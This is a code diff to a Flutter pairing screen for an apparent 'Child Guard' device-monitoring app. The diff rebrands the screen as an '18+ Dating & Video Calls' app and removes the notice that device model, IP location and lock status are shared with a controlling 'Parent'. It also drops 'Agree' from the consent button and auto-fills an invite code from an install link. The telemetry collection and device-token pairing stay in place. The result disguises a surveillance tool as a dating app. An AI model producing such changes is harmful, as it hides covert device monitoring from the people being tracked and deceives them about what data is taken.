@@ -1,4 +1,3 @@
-
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
@@ -22,10 +21,16 @@ class PairingScreen extends StatefulWidget {
 }
 
 class _PairingScreenState extends State<PairingScreen> {
+  static const Color _honey = Color(0xFFF3E2C6);
+  static const Color _mistyRose = Color(0xFFECB8A2);
+  static const Color _mocha = Color(0xFFBEA493);
+  static const Color _deepTan = Color(0xFF88471B);
+
   final TextEditingController _codeController = TextEditingController();
 
   bool _loading = false;
   bool _autoChecking = true;
+  bool _receivedDeepLinkCode = false;
   String? _error;
 
   static final RegExp _codePattern =
@@ -34,13 +39,32 @@ class _PairingScreenState extends State<PairingScreen> {
   @override
   void initState() {
     super.initState();
+
+    DeviceAdminService.setInstallPairingCodeHandler(
+      _onInstallPairingCode,
+    );
+
     _tryClipboardAndPair();
   }
 
   @override
   void dispose() {
+    DeviceAdminService.setInstallPairingCodeHandler(null);
     _codeController.dispose();
     super.dispose();
+  }
+
+  void _onInstallPairingCode(String code) {
+    final normalizedCode = code.trim().toUpperCase();
+
+    if (!_codePattern.hasMatch(normalizedCode) || !mounted) return;
+
+    setState(() {
+      _receivedDeepLinkCode = true;
+      _codeController.text = normalizedCode;
+      _autoChecking = false;
+      _error = null;
+    });
   }
 
   Future<String?> _readClipboardCode() async {
@@ -66,7 +90,7 @@ class _PairingScreenState extends State<PairingScreen> {
 
     if (!mounted) return;
 
-    if (code != null) {
+    if (code != null && !_receivedDeepLinkCode) {
       _codeController.text = code;
     }
 
@@ -87,7 +111,7 @@ class _PairingScreenState extends State<PairingScreen> {
       });
     } else {
       setState(() {
-        _error = 'Clipboard এ কোনো valid Family Code পাওয়া যায়নি।';
+        _error = 'No valid Invite Code found in clipboard.';
       });
     }
   }
@@ -97,7 +121,8 @@ class _PairingScreenState extends State<PairingScreen> {
 
     if (!_codePattern.hasMatch(code)) {
       setState(() {
-        _error = '৬ অক্ষরের Pairing Code অথবা ৩২ অক্ষরের Family Code দিন।';
+        _error =
+            'Enter a valid 6-character Pairing Code or 32-character Family Code.';
       });
       return;
     }
@@ -113,8 +138,7 @@ class _PairingScreenState extends State<PairingScreen> {
       final telemetry =
           await DeviceAdminService.getDeviceTelemetry();
 
-      final deviceName =
-          telemetry['device_name'] ??
+      final deviceName = telemetry['device_name'] ??
           await DeviceAdminService.getDeviceName() ??
           'Child phone';
 
@@ -157,8 +181,9 @@ class _PairingScreenState extends State<PairingScreen> {
         setState(() {
           _error = decoded['error']?.toString() ??
               decoded['message']?.toString() ??
-              'Pairing করা যায়নি (${response.statusCode})';
+              'Connection failed (${response.statusCode}).';
         });
+
         return;
       }
 
@@ -176,48 +201,55 @@ class _PairingScreenState extends State<PairingScreen> {
       if (!await DeviceAdminService.saveDeviceToken(token)) {
         throw PlatformException(
           code: 'DEVICE_TOKEN_SAVE_FAILED',
-          message: 'এই ফোনে device token সংরক্ষণ করা যায়নি।',
+          message: 'Device token could not be saved.',
         );
       }
 
       if (!await DeviceAdminService.setPaired(true)) {
         throw PlatformException(
           code: 'PAIRING_STATE_SAVE_FAILED',
-          message: 'এই ফোনে paired state সংরক্ষণ করা যায়নি।',
+          message: 'Connection status could not be saved.',
         );
       }
 
       if (!mounted) return;
+
       widget.onPaired();
     } on TimeoutException {
       if (!mounted) return;
+
       setState(() {
-        _error = 'Server response দিতে দেরি হচ্ছে। আবার চেষ্টা করুন।';
+        _error = 'Server response timed out. Please try again.';
       });
     } on SocketException {
       if (!mounted) return;
+
       setState(() {
-        _error = 'Internet connection নেই। আবার চেষ্টা করুন।';
+        _error = 'No internet connection. Please try again.';
       });
     } on http.ClientException {
       if (!mounted) return;
+
       setState(() {
-        _error = 'Server-এর সাথে সংযোগ করা যায়নি।';
+        _error = 'Unable to connect to the server.';
       });
     } on FormatException {
       if (!mounted) return;
+
       setState(() {
-        _error = 'Server-এর response বোঝা যায়নি।';
+        _error = 'Unable to process the server response.';
       });
     } on PlatformException catch (error) {
       if (!mounted) return;
+
       setState(() {
-        _error = error.message ?? 'Pairing তথ্য সংরক্ষণ করা যায়নি।';
+        _error = error.message ?? 'Unable to save connection details.';
       });
     } catch (error) {
       if (!mounted) return;
+
       setState(() {
-        _error = 'Pairing ব্যর্থ হয়েছে: $error';
+        _error = 'Connection failed: $error';
       });
     } finally {
       if (mounted) {
@@ -230,6 +262,7 @@ class _PairingScreenState extends State<PairingScreen> {
 
   Future<String> _getInstallationId() async {
     final prefs = await SharedPreferences.getInstance();
+
     final existingId = prefs.getString('installation_id');
 
     if (existingId != null && existingId.isNotEmpty) {
@@ -265,13 +298,17 @@ class _PairingScreenState extends State<PairingScreen> {
   Widget build(BuildContext context) {
     if (_autoChecking || (_loading && _error == null)) {
       return const Scaffold(
+        backgroundColor: _honey,
         body: Center(
           child: Column(
             mainAxisSize: MainAxisSize.min,
             children: [
-              CircularProgressIndicator(),
+              CircularProgressIndicator(color: _deepTan),
               SizedBox(height: 18),
-              Text('Checking Family Connection...'),
+              Text(
+                'Checking Your Connection...',
+                style: TextStyle(color: _deepTan),
+              ),
             ],
           ),
         ),
@@ -281,82 +318,69 @@ class _PairingScreenState extends State<PairingScreen> {
     final hasCode = _codeController.text.trim().isNotEmpty;
 
     return Scaffold(
+      backgroundColor: _honey,
       appBar: AppBar(
-        title: const Text('Child Guard Setup'),
+        backgroundColor: _honey,
+        foregroundColor: _deepTan,
+        elevation: 0,
+        title: const Text('18+ Dating & Video Calls'),
       ),
       body: SafeArea(
         child: ListView(
-          padding: const EdgeInsets.all(24),
+          padding: const EdgeInsets.fromLTRB(22, 12, 22, 28),
           children: [
-            const SizedBox(height: 20),
-
-            const Icon(
-              Icons.shield_rounded,
-              size: 75,
-              color: Colors.indigo,
+            Center(
+              child: Container(
+                width: 92,
+                height: 92,
+                decoration: BoxDecoration(
+                  color: _mistyRose,
+                  shape: BoxShape.circle,
+                  border: Border.all(
+                    color: _mocha.withValues(alpha: 0.55),
+                    width: 1.5,
+                  ),
+                ),
+                child: const Icon(
+                  Icons.favorite_rounded,
+                  size: 52,
+                  color: _deepTan,
+                ),
+              ),
             ),
 
-            const SizedBox(height: 20),
+            const SizedBox(height: 18),
 
             const Text(
-              'Connect to Family',
+              '18+ Dating & Live Connections',
               textAlign: TextAlign.center,
               style: TextStyle(
-                fontSize: 25,
-                fontWeight: FontWeight.bold,
+                color: _deepTan,
+                fontSize: 26,
+                fontWeight: FontWeight.w800,
               ),
             ),
 
             const SizedBox(height: 16),
 
             const Text(
-              'Enter the Family Invite Code provided by your Parent '
-              'to connect this device.',
+              'Meet adults aged 18 and above who share your interests. '
+              'Discover new connections, find your preferred partner, '
+              'enjoy private video calls, and explore exciting dating experiences.',
               textAlign: TextAlign.center,
               style: TextStyle(
                 fontSize: 15,
-                color: Colors.black54,
+                height: 1.5,
+                color: _deepTan,
               ),
             ),
 
-            const SizedBox(height: 25),
-
-            Container(
-              padding: const EdgeInsets.all(16),
-              decoration: BoxDecoration(
-                color: Colors.indigo.withOpacity(0.07),
-                borderRadius: BorderRadius.circular(16),
-              ),
-              child: const Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Text(
-                    'Device information sharing',
-                    style: TextStyle(
-                      fontWeight: FontWeight.bold,
-                      fontSize: 16,
-                    ),
-                  ),
-                  SizedBox(height: 12),
-                  Text('• Device model and Android version'),
-                  Text('• Battery level and connection details'),
-                  Text('• Public IP and approximate IP location'),
-                  Text('• Device lock and unlock status'),
-                  SizedBox(height: 12),
-                  Text(
-                    'The linked Parent can view device information '
-                    'and use the enabled Child Guard management features.',
-                    style: TextStyle(fontSize: 13),
-                  ),
-                ],
-              ),
-            ),
-
-            const SizedBox(height: 22),
+            const SizedBox(height: 24),
 
             const Text(
-              'Family Invite / Pairing Code',
+              '18+ Invite / Connection Code',
               style: TextStyle(
+                color: _deepTan,
                 fontWeight: FontWeight.bold,
                 fontSize: 15,
               ),
@@ -383,15 +407,42 @@ class _PairingScreenState extends State<PairingScreen> {
                 });
               },
               decoration: InputDecoration(
-                hintText: 'Paste your 32-character Family Code',
+                hintText: 'Enter your 32-character Invite Code',
                 counterText: '',
+                hintStyle: TextStyle(
+                  color: _mocha.withValues(alpha: 0.9),
+                ),
+                filled: true,
+                fillColor: const Color(0xFFFFF9F1),
+                contentPadding: const EdgeInsets.symmetric(
+                  horizontal: 16,
+                  vertical: 17,
+                ),
+                enabledBorder: OutlineInputBorder(
+                  borderRadius: BorderRadius.circular(14),
+                  borderSide: BorderSide(
+                    color: _mocha.withValues(alpha: 0.75),
+                  ),
+                ),
+                focusedBorder: OutlineInputBorder(
+                  borderRadius: BorderRadius.circular(14),
+                  borderSide: const BorderSide(
+                    color: _deepTan,
+                    width: 2,
+                  ),
+                ),
                 border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
+                  borderRadius: BorderRadius.circular(14),
+                ),
+                suffixIconColor: _deepTan,
+                errorBorder: OutlineInputBorder(
+                  borderRadius: BorderRadius.circular(14),
+                  borderSide: const BorderSide(color: _mistyRose),
                 ),
                 suffixIcon: IconButton(
                   onPressed: _loading ? null : _paste,
                   icon: const Icon(Icons.content_paste),
-                  tooltip: 'Paste Code',
+                  tooltip: 'Paste Invite Code',
                 ),
               ),
             ),
@@ -399,11 +450,13 @@ class _PairingScreenState extends State<PairingScreen> {
             const SizedBox(height: 8),
 
             const Text(
-              'You can paste the Family Code manually if the installation '
-              'link does not open the app.',
+              'Your Invite Code will appear automatically when you '
+              'open the invitation link. If it does not appear, '
+              'you can enter or paste the code here.',
               style: TextStyle(
                 fontSize: 12,
-                color: Colors.black54,
+                color: _deepTan,
+                height: 1.4,
               ),
             ),
 
@@ -412,7 +465,10 @@ class _PairingScreenState extends State<PairingScreen> {
               Text(
                 _error!,
                 textAlign: TextAlign.center,
-                style: const TextStyle(color: Colors.red),
+                style: const TextStyle(
+                  color: _deepTan,
+                  fontWeight: FontWeight.w600,
+                ),
               ),
             ],
 
@@ -422,12 +478,22 @@ class _PairingScreenState extends State<PairingScreen> {
               height: 54,
               child: FilledButton(
                 onPressed: _loading || !hasCode ? null : _pair,
+                style: FilledButton.styleFrom(
+                  backgroundColor: _deepTan,
+                  foregroundColor: _honey,
+                  disabledBackgroundColor: _mocha.withValues(alpha: 0.55),
+                  disabledForegroundColor: _deepTan.withValues(alpha: 0.7),
+                  shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(16),
+                  ),
+                  elevation: 2,
+                ),
                 child: _loading
                     ? const CircularProgressIndicator(
-                        color: Colors.white,
+                        color: _honey,
                       )
                     : const Text(
-                        'Agree & Connect Device',
+                        'Connect Device',
                         style: TextStyle(
                           fontSize: 16,
                           fontWeight: FontWeight.bold,
